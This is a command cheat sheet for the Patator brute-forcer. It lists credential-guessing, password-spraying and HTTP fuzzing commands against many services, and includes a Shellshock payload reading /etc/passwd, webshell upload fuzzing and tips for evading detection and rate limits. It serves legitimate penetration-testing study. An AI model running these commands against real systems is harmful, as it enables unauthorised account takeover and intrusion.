# Patator

> A modular, highly configurable multi-purpose brute-forcer with fine-grained control over responses and retries.

- Category: Credentials
- Commands: 100
- Page: https://terminal.rokibulroni.com/tool/credentials/patator
- Homepage: https://github.com/lanjelot/patator
- Tags: brute force, modular

## Install

- apt: `sudo apt install patator`

## Basic Credential Testing

### patator ssh_login host=127.0.0.1 user=admin password=password123

```bash
patator ssh_login host=127.0.0.1 user=admin password=password123
```

Tests a single static username and password against a local SSH service.

### patator ftp_login host=127.0.0.1 user=ftpuser password=ftppass

```bash
patator ftp_login host=127.0.0.1 user=ftpuser password=ftppass
```

Attempts a single credential pair authentication against an FTP server.

### patator telnet_login host=127.0.0.1 user=root password=toor

```bash
patator telnet_login host=127.0.0.1 user=root password=toor
```

Validates a single credential set against a legacy Telnet service.


## Basic Dictionary Attacks

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=passwords.txt

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=passwords.txt
```

Iterates through a password file testing against the static user 'admin'.

### patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=password123

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=password123
```

Iterates through a username file testing against a static password.

### patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE0 0=users.txt

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE0 0=users.txt
```

Tests username as password (user=pass) by using the same file input for both fields.


## Combinator Attacks

### patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt
```

Performs a standard brute-force attack trying every password for every user.

### patator ftp_login host=127.0.0.1 user=FILE0 0=users.txt password=COMBO0 0=combo_pass.txt

```bash
patator ftp_login host=127.0.0.1 user=FILE0 0=users.txt password=COMBO0 0=combo_pass.txt
```

Uses the COMBO iterator to test combinations defined in a single file.


## Payload Generation

### patator ssh_login host=127.0.0.1 user=admin password=RANGE0 0=1980-2025

```bash
patator ssh_login host=127.0.0.1 user=admin password=RANGE0 0=1980-2025
```

Generates a numeric range of years to test as passwords.

### patator vnc_login host=127.0.0.1 password=PROG0 0='python3 generate_pins.py'

```bash
patator vnc_login host=127.0.0.1 password=PROG0 0='python3 generate_pins.py'
```

Uses an external script (PROG0) to dynamically generate payloads.


## Web Authentication (Basic)

### patator http_fuzz url=http://127.0.0.1/protected/ method=GET auth_type=basic user=FILE0 0=users.txt password=FILE1 1=pas

```bash
patator http_fuzz url=http://127.0.0.1/protected/ method=GET auth_type=basic user=FILE0 0=users.txt password=FILE1 1=passwords.txt
```

Fuzzes HTTP Basic Authentication using lists for users and passwords.


## Web Authentication (Digest)

### patator http_fuzz url=http://127.0.0.1/digest/ method=GET auth_type=digest user=admin password=FILE0 0=passwords.txt

```bash
patator http_fuzz url=http://127.0.0.1/digest/ method=GET auth_type=digest user=admin password=FILE0 0=passwords.txt
```

Tests HTTP Digest Authentication against a specific user.


## Web Authentication (Form)

### patator http_fuzz url=http://127.0.0.1/login.php method=POST body='username=FILE0&password=FILE1&submit=Login' 0=users.t

```bash
patator http_fuzz url=http://127.0.0.1/login.php method=POST body='username=FILE0&password=FILE1&submit=Login' 0=users.txt 1=passwords.txt
```

Brute forces a standard HTML login form via POST request body.

### patator http_fuzz url=http://127.0.0.1/login method=POST body='{"user": "FILE0", "pass": "FILE1"}' header='Content-Type:

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='{"user": "FILE0", "pass": "FILE1"}' header='Content-Type: application/json' 0=users.txt 1=pass.txt
```

Tests a JSON API authentication endpoint by injecting payloads into a JSON body.


## Response Analysis

### patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=200

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=200
```

Ignores responses with HTTP status code 200 to isolate anomalies.

### patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:size=1234

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:size=1234
```

Ignores responses that match a specific byte size, common for standard failure pages.

### patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:fgrep='Invali

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:fgrep='Invalid password'
```

Ignores responses containing the specific string 'Invalid password'.


## SMB Protocol

### patator smb_login host=127.0.0.1 user=Administrator password=FILE0 0=passwords.txt

```bash
patator smb_login host=127.0.0.1 user=Administrator password=FILE0 0=passwords.txt
```

Tests SMB (Server Message Block) credentials against the Administrator account.

### patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt domain=WORKGROUP

```bash
patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=FILE1 1=passwords.txt domain=WORKGROUP
```

Performs SMB login testing specifying a target domain.


## Database Modules

### patator mysql_login host=127.0.0.1 user=root password=FILE0 0=passwords.txt

```bash
patator mysql_login host=127.0.0.1 user=root password=FILE0 0=passwords.txt
```

Brute forces the root account on a MySQL database server.

### patator mssql_login host=127.0.0.1 user=sa password=FILE0 0=passwords.txt

```bash
patator mssql_login host=127.0.0.1 user=sa password=FILE0 0=passwords.txt
```

Tests credentials against the SA account on a Microsoft SQL Server.

### patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=passwords.txt database=template1

```bash
patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=passwords.txt database=template1
```

Targets a specific PostgreSQL database instance for authentication.


## Remote Desktop

### patator rdp_login host=127.0.0.1 user=Administrator password=FILE0 0=passwords.txt

```bash
patator rdp_login host=127.0.0.1 user=Administrator password=FILE0 0=passwords.txt
```

Attempts to authenticate via RDP (Remote Desktop Protocol) using a password list.

### patator vnc_login host=127.0.0.1 password=FILE0 0=passwords.txt

```bash
patator vnc_login host=127.0.0.1 password=FILE0 0=passwords.txt
```

Tests VNC passwords which typically do not require a username.


## Email Protocols

### patator smtp_login host=127.0.0.1 user=FILE0 0=emails.txt password=FILE1 1=passwords.txt

```bash
patator smtp_login host=127.0.0.1 user=FILE0 0=emails.txt password=FILE1 1=passwords.txt
```

Validates credentials against an SMTP mail server.

### patator pop3_login host=127.0.0.1 user=test password=FILE0 0=passwords.txt

```bash
patator pop3_login host=127.0.0.1 user=test password=FILE0 0=passwords.txt
```

Tests passwords against a POP3 email account.

### patator imap_login host=127.0.0.1 user=test password=FILE0 0=passwords.txt

```bash
patator imap_login host=127.0.0.1 user=test password=FILE0 0=passwords.txt
```

Tests credentials against an IMAP service.


## Infrastructure

### patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=community_strings.txt

```bash
patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=community_strings.txt
```

Brute forces SNMP community strings to identify management access.

### patator ldap_login host=127.0.0.1 base_dn='dc=example,dc=com' user=FILE0 0=users.txt password=FILE1 1=passwords.txt

```bash
patator ldap_login host=127.0.0.1 base_dn='dc=example,dc=com' user=FILE0 0=users.txt password=FILE1 1=passwords.txt
```

Tests LDAP directory credentials with a specified Base DN.


## Archive cracking

### patator unzip_pass zipfile=archive.zip password=FILE0 0=passwords.txt

```bash
patator unzip_pass zipfile=archive.zip password=FILE0 0=passwords.txt
```

Attempts to crack the password of a protected ZIP file using a dictionary.


## Performance Control

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -t 10

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -t 10
```

Runs the attack using 10 concurrent threads to increase speed.

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --timeout 5

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --timeout 5
```

Sets a 5-second timeout per connection to drop hanging attempts quickly.


## Rate Limiting

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --rate-limit 1

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --rate-limit 1
```

Limits the attack speed to 1 request per second to evade detection.


## Error Handling

### patator http_fuzz url=http://127.0.0.1/ method=GET --max-retries 3

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET --max-retries 3
```

Retries failed connections up to 3 times before giving up on a payload.


## Target Enumeration

### patator ssh_login host=NET0 0=192.168.1.0/24 user=root password=toor

```bash
patator ssh_login host=NET0 0=192.168.1.0/24 user=root password=toor
```

Sprays a single credential pair across an entire CIDR network range.


## Password Spraying

### patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=Welcome123

```bash
patator smb_login host=127.0.0.1 user=FILE0 0=users.txt password=Welcome123
```

Performs a password spray attack testing one common password against many users.


## Output Control

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -v

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -v
```

Enables verbose mode to see detailed output of every attempt.


## Advanced HTTP

### patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: session_id=FILE0' 0=sessions.txt

```bash
patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: session_id=FILE0' 0=sessions.txt
```

Fuzzes the Cookie header to perform session hijacking or enumeration.

### patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: FILE0' 0=user_agents.txt

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: FILE0' 0=user_agents.txt
```

Rotates User-Agent strings to bypass simple WAF rules.

### patator http_fuzz url=https://127.0.0.1/ method=GET --cert client.pem --key client.key

```bash
patator http_fuzz url=https://127.0.0.1/ method=GET --cert client.pem --key client.key
```

Uses client-side SSL certificates for mutual TLS authentication testing.


## Proxy Usage

### patator http_fuzz url=http://target.com/ method=GET proxy=http://127.0.0.1:8080

```bash
patator http_fuzz url=http://target.com/ method=GET proxy=http://127.0.0.1:8080
```

Routes traffic through a local proxy (like Burp Suite) for inspection.

### patator ssh_login host=1.2.3.4 user=admin password=pass proxy=socks5://127.0.0.1:9050

```bash
patator ssh_login host=1.2.3.4 user=admin password=pass proxy=socks5://127.0.0.1:9050
```

Routes SSH attacks through a SOCKS5 proxy (e.g., Tor).


## Advanced Filtering

### patator http_fuzz url=http://127.0.0.1/ method=GET user=FILE0 0=users.txt -x ignore:header='Location: /login'

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET user=FILE0 0=users.txt -x ignore:header='Location: /login'
```

Ignores responses that redirect back to the login page.

### patator http_fuzz url=http://127.0.0.1/api method=POST body='token=FILE0' 0=tokens.txt -x quit:code=200

```bash
patator http_fuzz url=http://127.0.0.1/api method=POST body='token=FILE0' 0=tokens.txt -x quit:code=200
```

Stops the attack immediately upon receiving a 200 OK response.


## Oracle Database

### patator oracle_login host=127.0.0.1 sid=xe user=system password=FILE0 0=passwords.txt

```bash
patator oracle_login host=127.0.0.1 sid=xe user=system password=FILE0 0=passwords.txt
```

Attacks an Oracle Database SID with the system user.


## DNS Enumeration

### patator dns_forward host=127.0.0.1 name=FILE0.example.com 0=subdomains.txt

```bash
patator dns_forward host=127.0.0.1 name=FILE0.example.com 0=subdomains.txt
```

Performs DNS subdomain brute forcing by iterating prefixes.

### patator dns_forward host=127.0.0.1 name=example.com type=FILE0 0=types.txt

```bash
patator dns_forward host=127.0.0.1 name=example.com type=FILE0 0=types.txt
```

Iterates through DNS record types (A, MX, TXT) for a specific domain.


## Multi-Target

### patator ssh_login host=FILE0 0=hosts.txt user=root password=toor

```bash
patator ssh_login host=FILE0 0=hosts.txt user=root password=toor
```

Tests a single credential pair against a list of different hosts.


## Complex Iteration

### patator http_fuzz url=http://127.0.0.1/users/FILE0/files/FILE1 method=GET 0=users.txt 1=files.txt

```bash
patator http_fuzz url=http://127.0.0.1/users/FILE0/files/FILE1 method=GET 0=users.txt 1=files.txt
```

Fuzzes two different parts of a URL path simultaneously.


## Range Iteration

### patator http_fuzz url=http://127.0.0.1/id/RANGE0 method=GET 0=1000-2000

```bash
patator http_fuzz url=http://127.0.0.1/id/RANGE0 method=GET 0=1000-2000
```

Iterates through numeric IDs in the URL from 1000 to 2000.


## Stealth & Evasion

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --rate-limit 0.1

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt --rate-limit 0.1
```

Sets an extremely slow rate limit (1 request every 10 seconds) to avoid lockouts.


## Post-Exploitation

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x quit:mesg='Last login'

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x quit:mesg='Last login'
```

Detects successful SSH login by matching the 'Last login' banner message.


## Logging

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt > audit.log

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt > audit.log
```

Redirects standard output to a log file for later analysis.


## Resume Capability

### patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=pass --resume 100

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=users.txt password=pass --resume 100
```

Resumes the attack starting from the 100th entry in the user list.


## Advanced Fuzzing

### patator http_fuzz url=http://127.0.0.1/ method=POST body='xml=FILE0' 0=xxe_payloads.txt

```bash
patator http_fuzz url=http://127.0.0.1/ method=POST body='xml=FILE0' 0=xxe_payloads.txt
```

Injects XXE payloads into a POST body parameter.

### patator http_fuzz url=http://127.0.0.1/ method=GET header='X-Forwarded-For: FILE0' 0=ips.txt

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET header='X-Forwarded-For: FILE0' 0=ips.txt
```

Fuzzes the X-Forwarded-For header to test for IP spoofing vulnerabilities.


## R Services

### patator rlogin_login host=127.0.0.1 user=root client_user=root

```bash
patator rlogin_login host=127.0.0.1 user=root client_user=root
```

Tests for Rlogin trust relationships without a password.


## Java RMI

### patator java_rmi_login host=127.0.0.1 method=list

```bash
patator java_rmi_login host=127.0.0.1 method=list
```

Enumerates available methods on a Java RMI registry.


## File Upload

### patator http_fuzz url=http://127.0.0.1/upload method=POST body='file=FILE0' 0=webshells.txt header='Content-Type: multip

```bash
patator http_fuzz url=http://127.0.0.1/upload method=POST body='file=FILE0' 0=webshells.txt header='Content-Type: multipart/form-data'
```

Fuzzes file upload endpoints with various malicious file contents.


## Interactive Mode

### patator ssh_login host=127.0.0.1 user=root password=toor --interactive

```bash
patator ssh_login host=127.0.0.1 user=root password=toor --interactive
```

Runs the module in interactive mode for debugging responses.


## Persistent Connection

### patator http_fuzz url=http://127.0.0.1/ method=GET --persistent

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET --persistent
```

Uses HTTP Keep-Alive to reuse TCP connections and improve speed.


## Custom Separator

### patator ssh_login host=127.0.0.1 user=FILE0 0=creds.txt --sep ':'

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=creds.txt --sep ':'
```

Uses a custom separator to parse user:pass combos from a single file properly.


## LDAP Enumeration

### patator ldap_login host=127.0.0.1 base_dn='dc=lab' user=admin password=pass -v

```bash
patator ldap_login host=127.0.0.1 base_dn='dc=lab' user=admin password=pass -v
```

Verifies LDAP connectivity and credentials with verbose output.


## VNC Auth

### patator vnc_login host=127.0.0.1 password=FILE0 0=pass.txt --timeout 3

```bash
patator vnc_login host=127.0.0.1 password=FILE0 0=pass.txt --timeout 3
```

Fast VNC password cracking with short timeouts.


## Advanced Telnet

### patator telnet_login host=127.0.0.1 user=admin password=pass inputs='sh

```bash
patator telnet_login host=127.0.0.1 user=admin password=pass inputs='sh
exit
'
```

Sends additional inputs after login to verify shell access.


## SMB Domain Spray

### patator smb_login host=10.0.0.5 user=FILE0 0=domain_users.txt password=Summer2023! domain=CORP

```bash
patator smb_login host=10.0.0.5 user=FILE0 0=domain_users.txt password=Summer2023! domain=CORP
```

Sprays a seasonal password against domain users on a domain controller.


## Database Spray

### patator mysql_login host=NET0 0=10.0.0.0/24 user=root password=root

```bash
patator mysql_login host=NET0 0=10.0.0.0/24 user=root password=root
```

Checks for default MySQL credentials across a subnet.


## HTTP API Key Fuzzing

### patator http_fuzz url=http://127.0.0.1/api/v1/data method=GET header='Authorization: Bearer FILE0' 0=keys.txt -x ignore:

```bash
patator http_fuzz url=http://127.0.0.1/api/v1/data method=GET header='Authorization: Bearer FILE0' 0=keys.txt -x ignore:code=401
```

Tests a list of Bearer tokens, ignoring unauthorized responses.


## FTP Bounce

### patator ftp_login host=127.0.0.1 user=anonymous password=anonymous

```bash
patator ftp_login host=127.0.0.1 user=anonymous password=anonymous
```

Checks for anonymous FTP access.


## Response Regex

### patator http_fuzz url=http://127.0.0.1/login method=POST body='u=admin&p=FILE0' 0=pass.txt -x ignore:egrep='(Fail|Error|

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='u=admin&p=FILE0' 0=pass.txt -x ignore:egrep='(Fail|Error|Deny)'
```

Uses extended regex to ignore multiple failure keywords in responses.


## Postgres Database

### patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=pass.txt ssl=on

```bash
patator postgres_login host=127.0.0.1 user=postgres password=FILE0 0=pass.txt ssl=on
```

Enforces SSL encryption for PostgreSQL login attempts.


## AJAX Fuzzing

### patator http_fuzz url=http://127.0.0.1/ajax_check method=POST body='user=FILE0' 0=users.txt header='X-Requested-With: XM

```bash
patator http_fuzz url=http://127.0.0.1/ajax_check method=POST body='user=FILE0' 0=users.txt header='X-Requested-With: XMLHttpRequest'
```

Adds the AJAX header to properly test asynchronous endpoints.


## Cookie Poisoning

### patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: admin=FILE0' 0=booleans.txt

```bash
patator http_fuzz url=http://127.0.0.1/admin method=GET header='Cookie: admin=FILE0' 0=booleans.txt
```

Fuzzes a boolean cookie value (true/false, 0/1) to bypass checks.


## Advanced SSH

### patator ssh_login host=127.0.0.1 user=root key_file=FILE0 0=keys_folder/

```bash
patator ssh_login host=127.0.0.1 user=root key_file=FILE0 0=keys_folder/
```

Iterates through a folder of private keys attempting public key authentication.


## Rate Limit Bypass

### patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt header='X-Originating-I

```bash
patator http_fuzz url=http://127.0.0.1/login method=POST body='user=admin&pass=FILE0' 0=pass.txt header='X-Originating-IP: 127.0.0.FILE1' 1=RANGE1 1=1-254
```

Spoofs originating IP headers per request to bypass IP-based rate limiting.


## Blind SQL Injection

### patator http_fuzz url=http://127.0.0.1/item?id=FILE0 0=sqli.txt method=GET -x ignore:time<5

```bash
patator http_fuzz url=http://127.0.0.1/item?id=FILE0 0=sqli.txt method=GET -x ignore:time<5
```

Identifies blind SQL injection by filtering out responses that are faster than 5 seconds.


## WebDAV

### patator http_fuzz url=http://127.0.0.1/uploads/FILE0 0=filenames.txt method=PUT body='testing'

```bash
patator http_fuzz url=http://127.0.0.1/uploads/FILE0 0=filenames.txt method=PUT body='testing'
```

Tests for write permissions by attempting to PUT files on the server.


## Default Credentials

### patator ssh_login host=127.0.0.1 user=FILE0 0=defaults.txt password=FILE0

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=defaults.txt password=FILE0
```

Tests for credentials where username and password are identical.


## Parallel Job Control

### patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -t 50 --max-retries 0

```bash
patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -t 50 --max-retries 0
```

Aggressive parallel scanning with 50 threads and no retries.


## Content-Length Fuzzing

### patator http_fuzz url=http://127.0.0.1/ method=POST body='A' header='Content-Length: FILE0' 0=integers.txt

```bash
patator http_fuzz url=http://127.0.0.1/ method=POST body='A' header='Content-Length: FILE0' 0=integers.txt
```

Fuzzes Content-Length header to test for Request Smuggling vulnerabilities.


## HTTP Method Fuzzing

### patator http_fuzz url=http://127.0.0.1/private method=FILE0 0=methods.txt

```bash
patator http_fuzz url=http://127.0.0.1/private method=FILE0 0=methods.txt
```

Iterates HTTP methods (GET, POST, PUT, DELETE) to find allowed verbs.


## SNMP Write

### patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=communities.txt access=write

```bash
patator snmp_login host=127.0.0.1 version=2c community=FILE0 0=communities.txt access=write
```

Specifically hunts for write-capable SNMP community strings.


## Known Vulnerability Check

### patator http_fuzz url=http://127.0.0.1/ method=GET header='Shellshock: () { :;}; echo; /bin/cat /etc/passwd' -x ignore:s

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET header='Shellshock: () { :;}; echo; /bin/cat /etc/passwd' -x ignore:size=0
```

Injects a Shellshock payload into a custom header and looks for output.


## Complex List Parsing

### patator ssh_login host=127.0.0.1 user=FILE0 0=creds.csv --sep ',' password=FILE0

```bash
patator ssh_login host=127.0.0.1 user=FILE0 0=creds.csv --sep ',' password=FILE0
```

Parses a CSV file where user and password are in the same line separated by a comma.


## SMTP Enumeration

### patator smtp_login host=127.0.0.1 method=VRFY user=FILE0 0=users.txt

```bash
patator smtp_login host=127.0.0.1 method=VRFY user=FILE0 0=users.txt
```

Uses the VRFY command to valid existing users without logging in.


## Full Automation

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x ignore:code=fail > valid_ssh.txt

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt -x ignore:code=fail > valid_ssh.txt
```

Automates the attack and saves only valid credentials to a file.


## IPv6 Targets

### patator ssh_login host=::1 user=root password=toor

```bash
patator ssh_login host=::1 user=root password=toor
```

Targets a service running on the IPv6 localhost address.


## Debug Mode

### patator ssh_login host=127.0.0.1 user=root password=toor --debug

```bash
patator ssh_login host=127.0.0.1 user=root password=toor --debug
```

Runs with debug logging enabled to troubleshoot module errors.


## Blue Team Validation

### patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=top100.txt --rate-limit 100

```bash
patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=top100.txt --rate-limit 100
```

Floods authentication requests to verify if SIEM alerts trigger correctly.

### patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: sqlmap' -x quit:code=403

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET header='User-Agent: sqlmap' -x quit:code=403
```

Tests if the WAF correctly blocks known malicious User-Agents.


## Recursive Directories

### patator http_fuzz url=http://127.0.0.1/FILE0/ method=GET 0=dirs.txt -x ignore:code=404

```bash
patator http_fuzz url=http://127.0.0.1/FILE0/ method=GET 0=dirs.txt -x ignore:code=404
```

Simple directory brute forcing by ignoring Not Found errors.


## Protocol Fuzzing

### patator telnet_login host=127.0.0.1 user=FILE0 0=payloads.txt password=test

```bash
patator telnet_login host=127.0.0.1 user=FILE0 0=payloads.txt password=test
```

Injects fuzzing payloads into the username field of Telnet.


## MSSQL Integrated

### patator mssql_login host=127.0.0.1 user=guest password=guest

```bash
patator mssql_login host=127.0.0.1 user=guest password=guest
```

Checks for guest account access on MSSQL.


## Elasticsearch

### patator http_fuzz url=http://127.0.0.1:9200/_cat/indices method=GET -x ignore:code=401

```bash
patator http_fuzz url=http://127.0.0.1:9200/_cat/indices method=GET -x ignore:code=401
```

Checks for unauthenticated access to Elasticsearch indices.


## MongoDB

### patator mongodb_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt

```bash
patator mongodb_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt
```

Tests admin credentials against a MongoDB instance.


## Redis

### patator redis_login host=127.0.0.1 password=FILE0 0=pass.txt

```bash
patator redis_login host=127.0.0.1 password=FILE0 0=pass.txt
```

Brute forces the Redis requirepass directive.


## Virtual Host Enum

### patator http_fuzz url=http://127.0.0.1/ method=GET header='Host: FILE0.example.com' 0=subs.txt -x ignore:size=default_si

```bash
patator http_fuzz url=http://127.0.0.1/ method=GET header='Host: FILE0.example.com' 0=subs.txt -x ignore:size=default_size
```

Fuzzes the Host header to discover internal virtual hosts.


## Param Pollution

### patator http_fuzz url=http://127.0.0.1/page method=GET body='id=1&id=FILE0' 0=fuzz.txt

```bash
patator http_fuzz url=http://127.0.0.1/page method=GET body='id=1&id=FILE0' 0=fuzz.txt
```

Tests for HTTP Parameter Pollution by injecting duplicate parameters.


## Git Exposure

### patator http_fuzz url=http://127.0.0.1/.git/FILE0 method=GET 0=git_objects.txt -x ignore:code=404

```bash
patator http_fuzz url=http://127.0.0.1/.git/FILE0 method=GET 0=git_objects.txt -x ignore:code=404
```

Checks for accessible Git repository objects on a web server.


## Cleanup

### patator ssh_login host=127.0.0.1 user=admin password=pass --timeout 1

```bash
patator ssh_login host=127.0.0.1 user=admin password=pass --timeout 1
```

Final low-timeout check to ensure service is still responsive.

## Related tools

- [Hydra](https://terminal.rokibulroni.com/tool/credentials/hydra)
- [Medusa](https://terminal.rokibulroni.com/tool/credentials/medusa)
